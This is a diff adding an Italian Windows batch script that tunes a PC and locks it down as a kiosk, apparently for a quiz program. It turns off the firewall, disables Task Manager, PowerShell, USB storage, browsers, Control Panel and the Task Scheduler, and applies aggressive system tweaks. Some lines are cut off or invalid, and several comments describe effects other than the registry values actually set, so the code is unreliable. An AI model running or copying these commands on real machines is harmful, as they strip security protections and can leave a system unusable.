+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v AllowDeviceNameInTelemetry /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v RestrictImplicitTextCollection /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v RestrictImplicitInkCollection /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v AllowInputPersonalization /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\TextInput" /v AllowLinguisticDataCollection /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AdvertisingInfo" /v DisabledByGroupPolicy /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\SearchCompanion" /v DisableContentFileUpdates /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\SearchCompanion" /v NoFind /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableSearchBoxSuggestions /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableSearchBoxSuggestionsInStartMenu /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisablePreviewPane /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableWebSearch /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableSearchBoxSuggestionsInTaskbar /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\AppModel\SystemAppData\Microsoft.Windows.Cortana_cw5n1h2txyewy" /v PreventAutoRun /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v NoToastApplicationNotificationOnLockScreen /t REG_DWORD /d 1 /f
+
+echo.
+echo Tutti i tweak di UWT XpAntiSpy e WPD sono stati applicati.
+echo.
+
+REM Accelera l'avvio del sistema
+bcdedit /set bootmenupolicy legacy 2>&1
+bcdedit /timeout 3 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Serialize" /v StartupDelayInMSec /t REG_DWORD /d 0 /f
+
+echo Attivo il tema scuro di Windows...
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v AppsUseLightTheme /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v SystemUsesLightTheme /t REG_DWORD /d 0 /f
+
+echo Tema scuro attivato nel registro.
+
+echo Ottimizzazione della rete..
+
+REM Ottimizzazioni di rete per velocità massima
+netsh int tcp set global rss=enabled
+netsh int tcp set global netdma=enabled
+netsh int tcp set global dca=enabled
+netsh int tcp set global autotuninglevel=normal
+netsh int tcp set global ecncapability=enabled
+netsh int tcp set global timestamps=disabled
+netsh int tcp set global initialrto=2000
+netsh int tcp set global rsc=enabled
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v TcpAckFrequency /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v TCPNoDelay /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v Tcp1323Opts /t REG_DWORD /d 3 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v DefaultTTL /t REG_DWORD /d 64 /f
+
+
+echo.
+echo Rete ottimizzata.
+echo.
+
+REM Ottimizzazioni memoria estreme
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v DisablePagingExecutive /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v LargeSystemCache /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v SystemCacheLimit /t REG_DWORD /d 4294967295 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v SecondLevelDataCache /t REG_DWORD /d 1024 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ThirdLevelDataCache /t REG_DWORD /d 8192 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v DisablePageCombining /t REG_DWORD /d 1 /f
+
+REM Ottimizzazioni kernel ultra aggressive
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v Win32PrioritySeparation /t REG_DWORD /d 26 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v IRQ8Priority /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v IRQ16Priority /t REG_DWORD /d 2 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v LazyModeTimeout /t REG_DWORD /d 10000 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v AlwaysOn /t REG_DWORD /d 1 /f
+
+REM Elimina completamente Cortana e ricerca
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Experience\AllowCortana" /v value /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v SearchboxTaskbarMode /t REG_DWORD /d 0 /f
+taskkill /f /im SearchUI.exe 2>&1
+taskkill /f /im Cortana.exe 2>&1
+
+REM Disabilita Cortana nella taskbar (Windows 10/11)
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowCortanaButton" /t REG_DWORD /d 0 /f 2>&1
+echo Nascosto pulsante Cortana
+
+REM Disabilita ricerca Cortana
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search" /v "SearchboxTaskbarMode" /t REG_DWORD /d 0 /f 2>&1
+echo Disabilitata barra di ricerca
+
+REM Disabilita Cortana completamente
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d 0 /f 2>&1
+echo Cortana disabilitata globalmente
+
+REM Disabilita servizi correlati a Cortana
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Experience\AllowCortana" /v "value" /t REG_DWORD /d 0 /f 2>&1
+echo Servizi Cortana disabilitati
+
+REM Disabilita ricerca web e cloud search
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d 0 /f 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search" /v "CortanaConsent" /t REG_DWORD /d 0 /f 2>&1
+echo Ricerca web disabilitata
+
+REM Disabilita suggerimenti di ricerca
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\SearchSettings" /v "IsDeviceSearchHistoryEnabled" /t REG_DWORD /d 0 /f 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\SearchSettings" /v "IsAADCloudSearchEnabled" /t REG_DWORD /d 0 /f 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\SearchSettings" /v "IsMSACloudSearchEnabled" /t REG_DWORD /d 0 /f 2>&1
+echo Suggerimenti di ricerca disabilitati
+
+REM Termina processi Cortana se in esecuzione
+echo.
+echo Terminando processi Cortana...
+taskkill /f /im "SearchUI.exe" 2>&1
+taskkill /f /im "SearchApp.exe" 2>&1
+taskkill /f /im "cortana.exe" 2>&1
+echo Processi Cortana terminati
+
+REM Disabilita avvio automatico di Cortana
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Cortana" /t REG_SZ /d "" /f 2>&1
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Cortana" /f 2>&1
+echo Avvio automatico disabilitato
+
+REM Disattiva notizie e interessi
+echo Disattivando Notizie e Interessi...
+
+echo Disattivando widget taskbar...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Feeds" /v "ShellFeedsTaskbarViewMode" /t REG_DWORD /d 2 /f
+
+echo Disabilitando feed globalmente...
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Feeds" /v "EnableFeeds" /t REG_DWORD /d 0 /f
+
+echo Disabilitando aggiornamenti...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Feeds" /v "IsFeedsAvailable" /t REG_DWORD /d 0 /f
+
+echo Disabilitando hover...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Feeds" /v "HeadlinesOnHoverEnabled" /t REG_DWORD /d 0 /f
+
+echo Disabilitando notifiche...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Feeds" /v "SystemPeekEnabled" /t REG_DWORD /d 0 /f
+
+echo Disabilitando servizi...
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WpnUserService" /v "Start" /t REG_DWORD /d 4 /f
+
+echo Rimuovendo dati personalizzazione...
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Feeds\DSB" /f
+
+echo Terminando processi...
+taskkill /f /im "msedgewebview2.exe"
+taskkill /f /im "FeedsSyncTask.exe"
+taskkill /f /im "WpnUserService.exe"
+
+echo Disabilitando task programmate...
+schtasks /change /tn "Microsoft\Windows\Feeds\FeedsTask" /disable
+
+echo Disabilitando servizio notifiche...
+sc config "WpnService" start= disabled
+
+
+REM Ottimizzazioni grafiche estreme
+reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v DisableVidMemVBs /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v MMX Fast Path /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v FlipNoVsync /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\DirectDraw" /v EmulationOnly /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\DirectDraw" /v ForceNoSysLock /t REG_DWORD /d 1 /f
+
+REM Ottimizzazioni disco per velocità massima
+fsutil behavior set DisableLastAccess 1
+fsutil behavior set EncryptPagingFile 0
+fsutil behavior set DisableDeleteNotify 0
+fsutil behavior set DisableCompression 1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v NtfsDisableLastAccessUpdate /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v NtfsMemoryUsage /t REG_DWORD /d 2 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v NtfsDisable8dot3NameCreation /t REG_DWORD /d 1 /f
+
+REM Modifiche registro per performance estreme
+reg add "HKCU\Control Panel\Desktop" /v AutoEndTasks /t REG_SZ /d 1 /f
+reg add "HKCU\Control Panel\Desktop" /v HungAppTimeout /t REG_SZ /d 1 /f
+:: reg add "HKCU\Control Panel\Desktop" /v MenuShowDelay /t REG_SZ /d 0 /f >nul
+reg add "HKCU\Control Panel\Desktop" /v WaitToKillAppTimeout /t REG_SZ /d 1 /f
+reg add "HKCU\Control Panel\Desktop" /v LowLevelHooksTimeout /t REG_SZ /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control" /v WaitToKillServiceTimeout /t REG_SZ /d 1 /f
+
+REM Attiva modalità gaming estrema per i quiz
+reg add "HKCU\SOFTWARE\Microsoft\GameBar" /v AllowAutoGameMode /t REG_DWORD /d 1 /f
+reg add "HKCU\SOFTWARE\Microsoft\GameBar" /v AutoGameModeEnabled /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v value /t REG_D
+
+REM Disabilita parcheggio core CPU per prestazioni continue
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v ValueMin /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v ValueMax /t REG_DWORD /d 0 /f
+powercfg -setacvalueindex scheme_current 54533251-82be-4824-96c1-47b60b740d00 0cc5b647-c1df-4637-891a-dec35c318583 0
+powercfg -setactive scheme_current
+
+REM Imposta timer sistema per responsività massima
+bcdedit /set useplatformclock true 2>&1
+bcdedit /set disabledynamictick yes 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation" /v RealTimeIsUniversal /t REG_DWORD /d 1 /f
+
+REM Ritocchi explorer
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v EnableBalloonTips /t REG_DWORD /d 0 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSyncProviderNotifications /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v SearchOrderConfig /t REG_DWORD /d 0 /f
+
+
+::Avvio migliore
+echo Rilevamento core CPU...
+
+for /f "skip=1" %%i in ('wmic cpu get NumberOfLogicalProcessors /value') do (
+    for /f "tokens=2 delims==" %%j in ("%%i") do (
+        if not "%%j"=="" (
+            set CORE_COUNT=%%j
+            goto :found_cores
+        )
+    )
+)
+:found_cores
+
+echo Core rilevati: %CORE_COUNT%
+echo.
+echo Configurazione bcdedit...
+bcdedit /set numproc %CORE_COUNT%
+
+echo Disabilitazione core parking...
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v ValueMin /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v ValueMax /t REG_DWORD /d 0 /f
+
+echo Applicazione impostazioni power...
+powercfg -setacvalueindex scheme_current 54533251-82be-4824-96c1-47b60b740d00 0cc5b647-c1df-4637-891a-dec35c318583 0
+powercfg -setactive scheme_current
+
+bcdedit /set quietboot on
+bcdedit /set bootux disabled
+bcdedit /set bootmenupolicy legacy
+bcdedit /set bootstatuspolicy ignoreallfailures
+
+::Verbose logging
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v VerboseStatus /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableStatusMessages /t REG_DWORD /d 0 /f
+::Disattiva animazioni login
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 2 /f
+::Niente animazioni
+reg add "HKCU\Control Panel\Desktop" /v UserPreferencesMask /t REG_BINARY /d 9012038010000000 /f
+
+
+REM Disattiva lo sfondo immagine della schermata di login (lock screen)
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f
+echo Sfondo della schermata di login disattivato con successo.
+
+REM Modifica colore
+REM Imposta colore accent a grigio scuro (ARGB FF2F2F2F)
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Accent" /v AccentColorMenu /t REG_DWORD /d 0xFF2F2F2F /f
+REM Assicura che l'utente usi il colore accent personalizzato (non automatico)
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v ColorPrevalence /t REG_DWORD /d 1 /f
+REM Abilita l'accent color anche sulla barra delle applicazioni e start
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v EnableColorizationAfterLogon /t REG_DWORD /d 1 /f
+
+
+echo.
+echo Disattivando servizi non necessari...
+REM Disabilita servizi non necessari per performance
+sc config "Fax" start= disabled 2>&1
+sc config "PrintSpooler" start= disabled 2>&1
+sc config "RemoteRegistry" start= disabled 2>&1
+sc config "Themes" start= disabled 2>&1
+sc config "TabletInputService" start= disabled 2>&1
+sc config "WebClient" start= disabled 2>&1
+sc config "WSearch" start= disabled 2>&1
+sc config "RemoteAccess" start= disabled 2>&1
+sc config "SharedAccess" start= disabled 2>&1
+sc config "TrkWks" start= disabled 2>&1
+sc config "lfsvc" start= disabled 2>&1
+sc config "MapsBroker" start= disabled 2>&1
+sc config "NetTcpPortSharing" start= disabled 2>&1
+sc config "Spooler" start= disabled 2>&1
+sc stop "Spooler" 2>&1
+sc config "DiagTrack" start= disabled 2>&1
+sc stop "DiagTrack" 2>&1
+sc config "dmwappushservice" start= disabled 2>&1
+sc stop "dmwappushservice" 2>&1
+sc config "WerSvc" start= disabled 2>&1
+sc stop "WerSvc" 2>&1
+sc config "TrkWks" start= disabled 2>&1
+sc config "WbioSrvc" start= disabled 2>&1
+sc config lfsvc start= disabled
+sc config Schedule start= disabled
+sc stop Schedule
+sc config bthserv start= disabled
+sc stop bthserv
+:: sc config "SysMain" start= disabled >nul 2>&1
+echo.
+echo Servizi disattivati.
+echo.
+echo.
+REM Disattivazione di TUTTO !!! ATTENZIONE RISCHIOSO !!!
+
+echo Disattivazione tasto Windows...
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d "00000000000000000300000000005BE000005CE000000000" /f
+echo Disattivazione scorciatoie Windows + tasti...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoWinKeys" /t REG_DWORD /d "1" /f
+echo Disattivazione ALT+TAB...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "AltTabSettings" /t REG_DWORD /d "1" /f
+echo Disattivazione CTRL+SHIFT+ESC Task Manager...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
+echo Disattivazione CTRL+ALT+TAB...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d "1" /f
+echo Disattivazione F1 Help...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoSMHelp" /t REG_DWORD /d "1" /f
+echo Disattivazione Windows+L Lock...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d "1" /f
+echo Disattivazione Windows+D Show Desktop...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoClose" /t REG_DWORD /d "1" /f
+echo Disattivazione CTRL+N, CTRL+O, CTRL+S...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewContextMenu" /t REG_DWORD /d "1" /f
+echo Disattivazione Windows+Tab Task View...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoTaskGrouping" /t REG_DWORD /d "1" /f
+echo Disattivazione SHIFT+F10 menu contestuale...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoShellSearchButton" /t REG_DWORD /d "1" /f
+echo Disattivazione Windows+I Impostazioni...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d "1" /f
+echo Disattivazione Windows+A Action Center...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuSubFolders" /t REG_DWORD /d "1" /f
+echo.
+
+REM Disattiva PowerShell
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell" /v "DisablePowerShell" /t REG_DWORD /d "1" /f
+
+REM Disattiva Task View (Timeline)
+reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v "EnableActivityFeed" /t REG_DWORD /d "0" /f
+
+REM Disattiva Windows Search nel menu Start
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoFind" /t REG_DWORD /d "1" /f
+
+REM Disattiva drag & drop
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDragDrop" /t REG_DWORD /d "1" /f
+
+REM Nasconde i drive
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDrives" /t REG_DWORD /d "255" /f
+
+REM Disattiva accesso a Esplora risorse
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewOnDrive" /t REG_DWORD /d "255" /f
+
+REM Disattiva il pannello di navigazione laterale
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoNavPane" /t REG_DWORD /d "1" /f
+
+REM Disattiva la Action Center
+reg add "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d "1" /f
+
+REM Disattiva la barra di ricerca Cortana
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "SearchboxTaskbarMode" /t REG_DWORD /d "0" /f
+
+REM Nasconde la barra delle app (system tray)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoTrayItemsDisplay" /t REG_DWORD /d "1" /f
+
+
+REM Disattiva il cambio password da Ctrl+Alt+Del
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableChangePassword" /t REG_DWORD /d "1" /f
+
+REM Disattiva il Task Manager anche da Ctrl+Alt+Del
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
+
+REM Disattiva riavvio/chiusura da menu Start
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoClose" /t REG_DWORD /d "1" /f
+
+REM Disattiva Impostazioni (app moderna)
+reg add "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:*" /f
+
+REM Disattiva accesso al Microsoft Store
+reg add "HKCU\Software\Policies\Microsoft\WindowsStore" /v "RemoveWindowsStore" /t REG_DWORD /d "1" /f
+
+REM Impedisce installazioni da supporti rimovibili
+reg add "HKLM\Software\Policies\Microsoft\Windows\Installer" /v "DisableMedia" /t REG_DWORD /d "1" /f
+
+REM Blocca lanciare eseguibili da supporti USB/CD/DVD
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoAutorun" /t REG_DWORD /d "1" /f
+
+REM Niente set folder
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoSetFolders" /t REG_DWORD /d "1" /f
+
+REM Nasconde completamente la barra delle applicazioni
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoSetTaskbar" /t REG_DWORD /d "1" /f
+
+REM Disabilita l'accesso alle porte USB
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /t REG_DWORD /d "4" /f
+
+REM Disabilita autoplay per tutte le unità
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDriveTypeAutoRun" /t REG_DWORD /d "255" /f
+
+REM Disattiva Windows Script Host
+reg add "HKLM\Software\Microsoft\Windows Script Host\Settings" /v "Enabled" /t REG_DWORD /d "0" /f
+
+
+REM Disattiva SMB
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SMB1" /t REG_DWORD /d "0" /f
+
+REM Disattiva remote desktop
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d "1" /f
+
+REM Disattiva telemetria
+reg add "HKLM\Software\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
+
+REM Disattiva USBStor
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /t REG_DWORD /d "4" /f
+
+REM Disattiva sincronizzazioni onedrive
+reg add "HKLM\Software\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSync" /t REG_DWORD /d "1" /f
+
+REM Disattiva firewall
+netsh advfirewall set allprofiles state off
+
+REM Limitazione powershell
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell" /v "EnableScripts" /t REG_DWORD /d "0" /f
+
+REM Rimuovi store
+reg add "HKLM\Software\Policies\Microsoft\WindowsStore" /v "RemoveWindowsStore" /t REG_DWORD /d "1" /f
+
+REM Niente report errori
+reg add "HKLM\Software\Microsoft\Windows\Windows Error Reporting" /v "Disabled" /t REG_DWORD /d "1" /f
+
+REM Disattivazione totale pannello di controllo e impostazioni
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:all" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoFind" /t REG_DWORD /d "1" /f
+
+REM Disattiva modifica orario di sistema
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TimeZoneInformation" /v "DisableAutoDaylightTimeSet" /t REG_DWORD /d "1" /f
+
+REM Disattiva modifica impostazioni di rete
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Network Connections" /v "NC_ShowSharedAccessUI" /t REG_DWORD /d "0" /f
+
+REM Disattiva condivisione file e stampanti
+netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=No
+
+REM Disattiva modifica desktop
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v "NoChangingWallpaper" /t REG_DWORD /d "1" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v "NoChangingWallPaper" /t REG_DWORD /d "1" /f
+
+REM Blocca esecuzione strumenti amministrativi
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "lusrmgr.msc" /f
+
+
+REM Disattiva avvio dei browser
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "chrome.exe" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "2" /t REG_SZ /d "firefox.exe" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "3" /t REG_SZ /d "msedge.exe" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "4" /t REG_SZ /d "iexplore.exe" /f
+
+REM Disattivazione tasto windows
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d "00000000000000000300000000005BE000005CE000000000" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuMorePrograms" /t REG_DWORD /d "1" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuPinnedList" /t REG_DWORD /d "1" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuMFUprogramsList" /t REG_DWORD /d "1" /f
+Stop-Process -Name StartMenuExperienceHost -Force
+
+
+REM Impostazione totale shell e disattivazione explorer.exe
+::reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "C:\AQ\wquiz.exe" /f
+::reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "cmd.exe /c %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\autowquiz.bat" /f
+
+REM Crea il file C:\quizprir.bat con il comando start /REALTIME
+::echo start /REALTIME C:\AQ\wquiz.exe > C:\quizprir.bat
+(
+    echo start /REALTIME C:\AQ\wquiz.exe
+    echo start /HIGH C:\AQ\supdate.exe
+) > C:\quizprir.bat
+
+
